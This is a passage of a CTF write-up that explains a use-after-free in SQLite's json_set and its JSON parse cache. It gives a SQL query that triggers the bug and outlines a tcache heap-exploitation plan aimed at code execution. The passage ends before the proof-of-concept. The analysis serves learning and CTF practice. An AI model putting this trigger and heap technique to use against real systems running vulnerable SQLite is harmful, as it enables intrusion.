class="token string" style="color:hsl(119, 34%, 47%)">&quot;b&quot;</span><span class="token plain">:</span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;c&quot;</span><span class="token plain">:</span><span class="token number" style="color:hsl(35, 99%, 36%)">6</span><span class="token plain">}}}</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">do_execsql_test json101</span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token number" style="color:hsl(35, 99%, 36%)">22.2</span><span class="token plain"> {</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">SELECT</span><span class="token plain"> json_replace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;{&quot;a&quot;:7,&quot;b&quot;:8,&quot;c&quot;:9}&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.a&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;1&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.a&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;2&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.b&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;3&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.b&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;4&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.c&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;5&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.c&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;6&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">} {{{</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;a&quot;</span><span class="token plain">:</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;b&quot;</span><span class="token plain">:</span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;c&quot;</span><span class="token plain">:</span><span class="token number" style="color:hsl(35, 99%, 36%)">6</span><span class="token plain">}}}</span><br></span></code></pre></div></div>
<p>Let&#x27;s try them out in the docker.</p>
<div><figure><img src="/assets/image (162).png" alt=""><figcaption><p><code>json_set</code> test</p></figcaption></figure> <figure><img src="/assets/image (163).png" alt=""><figcaption><p><code>json_replace</code> test</p></figcaption></figure></div>
<p>And that right there, is the pwn we&#x27;ve been looking for.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="sqlite3-and-json">sqlite3 and JSON<a href="#sqlite3-and-json" class="hash-link" aria-label="Direct link to sqlite3 and JSON" title="Direct link to sqlite3 and JSON">​</a></h2>
<p>So at the moment we know there&#x27;s a UAF in the <code>json_set</code> and <code>json_replace</code> functions, but what are <a href="https://www.sqlite.org/json1.html#jset" target="_blank" rel="noopener noreferrer">these functions</a>?</p>
<p><code>json_set</code> takes a json object and key-value pairs, and assigns each pair to the json object (<code>json[key] = value]</code>).</p>
<p><code>json_replace</code> is similar, but only sets the value if the key <em>exists</em> in the object.</p>
<p>From what I could see, there doesn&#x27;t seem to be a proper JSON object type in sqlite, rather they take and return strings representing JSON objects, which you can see in the test cases as well. This means they need to parse the JSON string every time it&#x27;s used.</p>
<p>For this writeup we&#x27;ll focus on <code>json_set</code>, but note that you could most likely also do this challenge using <code>json_replace</code> (or <code>json_insert</code>).</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="json_set">json_set<a href="#json_set" class="hash-link" aria-label="Direct link to json_set" title="Direct link to json_set">​</a></h3>
<p><code>json_set</code> is implemented with <code>jsonSetFunc</code> (bet you didn&#x27;t see that coming).</p>
<figure><img src="/assets/image (164).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2932">jsonSetFunc</a></p></figcaption></figure>
<p>We see that a function called <code>jsonParseCached</code> is used to generate the <code>pParse</code> object we saw earlier which, based on the name, we can assume would parse the JSON string, but also keeps a cache to speed up parsing, which makes sense as a JSON string would have to be parsed each time one was used. Also the bug description described a cache spill/overflow, so I wonder if this has anything to do with it. Foreshadowing is a literary device in wh-</p>
<p>After parsing the JSON it pretty much does what you&#x27;d expect:</p>
<ul>
<li>Lookup the key to get the value <code>pNode</code> (if it doesn&#x27;t exist a null slot is allocated by <code>jsonLookup</code>).</li>
<li>The value <code>pNode</code> is replaced by the new value with <code>jsonReplaceNode</code>.</li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>You may have also noticed the <code>bIsSet ? &quot;set : &quot;insert&quot;</code>, which is because this function can also implement <code>json_insert</code>. We don&#x27;t need to worry about the extra logic that this brings as we don&#x27;t use it here.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="struct-jsonparse">struct JsonParse<a href="#struct-jsonparse" class="hash-link" aria-label="Direct link to struct JsonParse" title="Direct link to struct JsonParse">​</a></h3>
<p>Ths is the type of the object <code>pParse</code>, which represents a <strong>parsing</strong> of the JSON string, not a typical JSON object you might be picturing which has a list of key-value pairs or a hash table. Think of it more like an AST (Abstract Syntax Tree).</p>
<figure><img src="/assets/image (169).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L192">struct jsonParse</a></p></figcaption></figure>
<p>It stores the JSON string that the parse came from and a list of nodes in <code>aNode</code>, which can have multiple <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L113" target="_blank" rel="noopener noreferrer">types</a>:</p>
<ul>
<li>OBJECT/ARRAY: These refer to <code>{}</code>/<code>[]</code> respectively, and store the total number of nodes contained in the object/array, which directly follow this object.</li>
<li>STRING/INT/REAL: These contain pointers into the main JSON string referring to the string/int/real, plus the length.</li>
<li>NULL: Represents a <code>null</code>.</li>
</ul>
<figure><img src="/assets/image (170).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L154">struct JsonNode</a></p></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jsonparsecached">jsonParseCached<a href="#jsonparsecached" class="hash-link" aria-label="Direct link to jsonParseCached" title="Direct link to jsonParseCached">​</a></h3>
<p><code>jsonParseCached</code> is a bit confusing at first, because there&#x27;s a lot of logic relating to caching that we don&#x27;t need to worry about <em>too</em> much (particularly regarding whether the JSON is allowed prior edits), so I&#x27;ll just cover the essentials.</p>
<figure><img src="/assets/image (168).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1884">jsonParseCached</a></p></figcaption></figure>
<p>Since an sqlite object is passed, we need to extract the raw <code>char*</code> in <code>zJson</code> and the size in <code>nJson</code>.</p>
<figure><img src="/assets/image (171).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1900">jsonParseCached</a></p></figcaption></figure>
<p>Then it iterates through all the possible entries in the JSON parser cache. sqlite stores these in a singly linked list along with other auxillary data allocations (accessed by <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/vdbeapi.c#L1038" target="_blank" rel="noopener noreferrer">sqlite3_get_auxdata</a>). Since they&#x27;re lumped in with other types of allocations, they&#x27;re uniquely identified by giving them a set of keys that are only used by JSON parse objects, starting at <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1853" target="_blank" rel="noopener noreferrer">JSON_CACHE_ID</a>, and containing <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1854" target="_blank" rel="noopener noreferrer">JSON_CACHE_SZ</a> (4) keys.</p>
<p>If a slot is missing, it&#x27;s marked using <code>iMinKey</code>, which is used later as the slot to store a new <code>JsonParse</code> object.</p>
<figure><img src="/assets/image (176).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1925">jsonParseCached</a></p></figcaption></figure>
<p>A slot can also be marked using <code>iMinKey</code> if it&#x27;s been in the cache too long. This is implemented using numbers representing the <code>iHold</code> of an object. The object with the lowest <code>iHold</code> will be removed, and new objects are marked with the highest <code>iHold</code> out of the currently cached items.</p>
<p>It&#x27;s easier to think of it like a FIFO queue: An object is inserted into the cache, and as more objects are inserted, the original one is pushed to the end, where it&#x27;s eventually dequeued to make room for the next one.</p>
<p>A JSON string is matched to cache entry typically by comparing the JSON strings using <code>memcmp</code>. There is more logic relating to this, but it&#x27;s not that important for our purposes here.</p>
<figure><img src="/assets/image (174).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1942">jsonParseCached</a></p></figcaption></figure>
<p>Above is how a new <code>JsonParse</code> object is created if a cached one couldn&#x27;t be found. While most of this isn&#x27;t too important, there are some details which are interesting to note:</p>
<ul>
<li>Line 1959: The reference count is set to 1.</li>
<li>Line 1963: This is a case where <code>jsonParse</code> failed, and there&#x27;s a comment that the caller will own the new <code>JsonParse</code> object. If that&#x27;s what happens in the case of an error, what happens normally?</li>
<li>Line 1971: Well see that it&#x27;s actually the <em>cache</em> that owns the object, <em>not</em> the caller. Hmmm...</li>
<li>Line 1972: The object is stored to the cache using <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/vdbeapi.c#L1066" target="_blank" rel="noopener noreferrer">sqlite3_set_auxdata</a>, at <code>iMinKey</code>, with the destructor <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L673" target="_blank" rel="noopener noreferrer">jsonParseFree</a>. If it&#x27;s replacing an entry that already exists, then the existing entry is freed using its destructor.</li>
</ul>
<p>The destructor in question behaves how you might expect:</p>
<figure><img src="/assets/image (179).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L673">jsonParseFree</a></p></figcaption></figure>
<p>Decrements the reference count until it&#x27;s 1, in which case free it.</p>
<p>This idea of the cache owning the object is also elaborated on in a <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1868" target="_blank" rel="noopener noreferrer">comment above</a>:</p>
<figure><img src="/assets/image (180).png" alt=""><figcaption></figcaption></figure>
<p>And if you remember what the patch was, it was <code>jsonSetFunc</code> incrementing the reference count themselves, effectively also taking ownership of the object. So clearly something went wrong with this idea, and they seemingly had to backtrack a bit to fix it.</p>
<p>So to summarise:</p>
<ul>
<li><code>JsonParse</code> objects are cached in a queue of size 4.</li>
<li>It will attempt to find a cached entry before making a new one.</li>
<li>If one can not be found, a new one will be made.</li>
<li>This new one is added to the queue, potentially forcing another existing entry out of the queue, causing it to be freed.</li>
<li>All entries belong to the cache and have a reference count of 1, which are unchanged by <code>jsonSetFunc</code> and <code>jsonReplaceFunc</code>.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jsonreplacenode">jsonReplaceNode<a href="#jsonreplacenode" class="hash-link" aria-label="Direct link to jsonReplaceNode" title="Direct link to jsonReplaceNode">​</a></h3>
<p>Let&#x27;s have a closer look at how the value node is replaced in <code>json_set</code>. Remember that <code>jsonSetFunc</code> uses <code>jsonLookup</code> (exact details of how this works aren&#x27;t important) to find a node for the value corresponding to the key, and if the key doesn&#x27;t already exist, allocate a NULL node for the value of this new key, and use that.</p>
<figure><img src="/assets/image (181).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2797">jsonReplaceNode</a></p></figcaption></figure>
<p>The way replacing a node works is basically by allocating a SUBST node that references the node to be replaced, but the details of this aren&#x27;t necessary here. Then there&#x27;s a switch case depending on the type of the sqlite object, so it can handle each type separately. Let&#x27;s look at the TEXT case.</p>
<figure><img src="/assets/image (182).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2838">jsonReplaceNode</a></p></figcaption></figure>
<p>There&#x27;s a lot going on here, but it really comes down to 2 separate cases:</p>
<ul>
<li><code>sqlite3_value_subtype(pValue) != JSON_SUBTYPE</code></li>
<li><code>sqlite3_value_subtype(pValue) == JSON_SUBTYPE</code></li>
</ul>
<p>What does it mean for a <code>pValue</code> to be have <code>JSON_SUBTYPE</code>. Well, while there isn&#x27;t a JSON object type per se, there <em>is</em> a distinction between strings that came from JSON functions like <code>json</code>, <code>json_set</code> etc. These are marked as having the subtype <code>JSON_SUBTYPE</code> by <code>jsonReturnJson</code>, which is used by most of the JSON related functions.</p>
<figure><img src="/assets/image (183).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L832">jsonReturnJson</a></p></figcaption></figure>
<p>So for example the string <code>&quot;hello world&quot;</code> would <em>not</em> be considering a JSON subtype, but <code>json(&quot;hello world&quot;)</code> <em>would</em>. And if you remember the test cases once again, they used strings in calls to <code>json</code>. Why is that important?</p>
<p>Well, if we have a closer look at the <code>JSON_SUBTYPE</code> case:</p>
<figure><img src="/assets/image (185).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2857">jsonReplaceNode</a></p></figcaption></figure>
<p>There&#x27;s a call to <code>jsonParseCached</code>, which would make sense, considering that it expects this to be a JSON string. Harmless, right?</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-uaf">The UAF<a href="#the-uaf" class="hash-link" aria-label="Direct link to The UAF" title="Direct link to The UAF">​</a></h2>
<p>Well let&#x27;s go back to <code>jsonParseCached</code>. We know that it either returns a <code>JsonParse</code> from the cache, or creates a new one ands adds it to the cache. Either way, a <code>JsonParse</code> from <code>jsonParseCached</code> will belong to the cache. That would include the original <code>JsonParse</code> all the way back in <code>jsonSetFunc</code>.</p>
<p>We also know that <code>jsonParseCached</code> can push old objects out of the cache, causing them to be freed using <code>jsonParseFree</code>. This could also include the original <code>JsonParse</code> from <code>jsonSetFunc</code>!</p>
<p>This on its own isn&#x27;t a problem, but considering the fact that the object would only belong to the cache, this is <em>now</em> a problem, because when it&#x27;s freed by <code>jsonParseFree</code>, it would see that the reference count is 1, so it believes that nothing else is using it (only the cache is), so it&#x27;s safe to free it!</p>
<p>But of course, it <em>is</em> in use, in <code>jsonSetFunc</code>, so this causes a UAF!</p>
<p>Walking this through with the (slightly modified) test case:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">SELECT</span><span class="token plain"> json_set</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;{}&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.a&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;1&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.b&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;2&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.c&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;3&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;$.d&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&#x27;4&#x27;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<ol>
<li>All the <code>json</code> function calls are evaluated. These would just return the strings themselves, but they&#x27;d be marked as <code>JSON_SUBTYPE</code>. (They would be parsed and cached, but this doesn&#x27;t affect much, except clear the previous cache).</li>
<li>The <code>&#x27;{}&#x27;</code> would be parsed and cached by <code>jsonParseCached</code>, placing it at the back of the queue.</li>
<li>The <code>&#x27;$.a&#x27;</code> key is looked up, and the <code>null</code> value would be replaced by <code>&#x27;1&#x27;</code>. Since it has <code>JSON_SUBTYPE</code>, it&#x27;s parsed and cached, pushing <code>&#x27;{}&#x27;</code> 1 slot along.</li>
<li>Repeat for <code>&#x27;$.b&#x27;</code> and <code>&#x27;$.c&#x27;</code>.</li>
<li>By now, the original <code>&#x27;{}&#x27;</code> is at the end of the queue, so when <code>&#x27;4&#x27;</code> is parsed and cached, it forces <code>&#x27;{}&#x27;</code> to be dequeued and freed, resulting in a UAF.</li>
</ol>
<figure><img src="/assets/corchat_uaf.gif" alt=""><figcaption></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="so-what-now">So what now?<a href="#so-what-now" class="hash-link" aria-label="Direct link to So what now?" title="Direct link to So what now?">​</a></h3>
<p>Right now, we have the DOS like the description mentioned, now for the RCE. But how?</p>
<p>Well first we need to control what happens right after the UAF is created to prevent a crash. So what happens next?</p>
<p>Well after the parsing the value that needs to be added to the object, it needs to then add the nodes corresponding to that value. It does this with <code>jsonParseAddNodeArray</code>.</p>
<figure><img src="/assets/image (186).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1121">jsonParseAddNodeArray</a></p></figcaption></figure>
<p>Remember at this point, the <code>pParse</code> object has been freed, which would corrupt some of the first fields of the object, depending on what bin it was freed to. By debugging, we can verify that it (usually) gets freed to tcache.</p>
<figure><img src="/assets/image (187).png" alt=""><figcaption><p>Right after UAF</p></figcaption></figure>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>I debugged it by following <a href="https://ir0nstone.gitbook.io/notes/challenges-in-containers" target="_blank" rel="noopener noreferrer">these instructions</a>:</p><ol>
<li>Running <code>python</code> or <code>python app.py</code></li>
<li>Running <code>gdbserver :9090 --attach $(pidof python3)</code> in another shell</li>
<li>Running gdb -&gt; <code>target remote 127.0.0.1:9090</code> in another another shell</li>
</ol></div></div>
<p>Here we see it&#x27;s been freed specifically to <code>tcachebins[0x60]</code>, which makes sense since we&#x27;re on glibc 2.31, plus the size of the <code>JsonParse</code> structure is 0x50 bytes (+ a few more from storing <code>&#x27;{}&#x27;</code>). And from the structure dump, we see that the tcache key (a pointer to <code>tcache_perthread_struct</code>) overlaps with <code>aNode</code>, which is a pointer to the list of nodes making up the <code>JsonParse</code>.</p>
<p>This is interesting, because now we&#x27;re in <code>jsonParseAddNodeArray</code>, which is about to copy a new set of nodes to <code>aNode</code> if there&#x27;s room, and if there isn&#x27;t, it will <code>realloc</code> it.</p>
<p>Theoretically this could allow arbitrary control over <code>tcache_perthread_struct</code>, but there a few problems currently:</p>
<ol>
<li>An array of <code>JsonNode</code>s isn&#x27;t very good for controlling data, as we don&#x27;t have much control over these. This means that not only is it bad for arbitrary control, but by clobbering <code>tcache</code>, it&#x27;ll likely cause a crash in some <code>malloc</code> call.</li>
<li><code>realloc</code>&#x27;ing <code>tcache</code> to a smaller size also clobbers it, as a new size field will show up in the middle of <code>tcache</code>.</li>
<li><code>nNode</code> and <code>nAlloc</code> are also overwritten by the <code>fd</code>, so if there&#x27;s a pointer overlapping this, these fields will be very large and likely result in a crash.</li>
</ol>
<p>The 3rd problem can be fixed by using a spray to empty <code>tcachebins[0x60]</code> beforehand, that way the <code>fd</code> field will be <code>NULL</code>.</p>
<p>The 1st and 2nd problem we can solve by <code>realloc</code>&#x27;ing with a size larger than <code>0x290</code> (the size of <code>tcache_perthread_struct</code>). If a <code>realloc</code> call is passed a larger size than the current size of the chunk, and can&#x27;t expand forward, it&#x27;ll resort to just:</p>
<ol>
<li><code>malloc</code>&#x27;ing a new, larger chunk.</li>
<li>Copying over the data to the new chunk.</li>
<li><code>free</code>&#x27;ing the old chunk.</li>
</ol>
<p>This would allow us to perform a <code>House of Spirit</code> attack on <code>tcache_perthread_struct</code>, and if we could allocate on top of that with controlled data, we can get an arbitrary write.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="data-spraying">Data Spraying<a href="#data-spraying" class="hash-link" aria-label="Direct link to Data Spraying" title="Direct link to Data Spraying">​</a></h3>
<p>For this we&#x27;d need a way of spraying controlled data, and this is where I started to struggle, as I was unable to find such a primitive. It turns out the answer was held by another JSON function.</p>
<p>After the CTF, I saw that ryaagard (the challenge author) revealed how they were able to spray data.</p>
<figure><img src="/assets/image (188).png" alt=""><figcaption><p><code>json_extract</code> spray</p></figcaption></figure>
<p>This was rather annoying, because if I just kept looking at <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c" target="_blank" rel="noopener noreferrer">src/json.c</a> I probably could&#x27;ve found it, but oh well.</p>
<p><code>json_extract</code> takes a JSON string and a key, extracts the value corresponding to the provided key, and returns it. It&#x27;s implemented by <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2530" target="_blank" rel="noopener noreferrer">jsonExtractFunc</a>, and the key part that makes this possible is <a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L889" target="_blank" rel="noopener noreferrer">jsonReturn</a>.</p>
<figure><img src="/assets/image (189).png" alt=""><figcaption><p><a href="https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L938">jsonReturn</a></p></figcaption></figure>
<p>Specifically the <code>JSON_STRING</code> case, and when the string contains escape sequences (signified by <code>jnFlags &amp; JNODE_RAW == 0 &amp;&amp; jnFlags &amp; JNODE_ESCAPE != 0</code>), it will <code>malloc</code> a chunk that&#x27;s the same length as the escaped sequence, to ensure that there&#x27;s no possibility of an overflow, as an escaped character will be longer than the character itself. It then goes on to unescape the sequence, making it very useful for a data spray. Although it should be noted that you can&#x27;t control every single byte in a &quot;chunk&quot; you allocate, due to how the <code>malloc</code>&#x27;ed size will be larger than the unescaped size.</p>
<p>We can also use this to spray <code>tcachebins[0x60]</code> to empty it.</p>
<p>To ensure these data sprays are preserved (i.e. not freed), we can use a sequence of <code>SELECT json_extract(...)</code> statements joined by <code>UNION</code>. I tried other ways of creating these sprays, such as string concatentation, or store them in a list, but both of these methods failed, likely because the strings would only be needed temporarily, and thus be freed (e.g. in concatenation of 2 strings, neither of them are needed again after the concatenation as they make a new, longer string). It seems that <code>UNION</code> keeps them around however, perhaps because it only combines the results at the very end.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="smashing-tcache">Smashing tcache<a href="#smashing-tcache" class="hash-link" aria-label="Direct link to Smashing tcache" title="Direct link to Smashing tcache">​</a></h3>
<p>Let&#x27;s put all of this together into a POC which overwrites tcache with junk.</p>
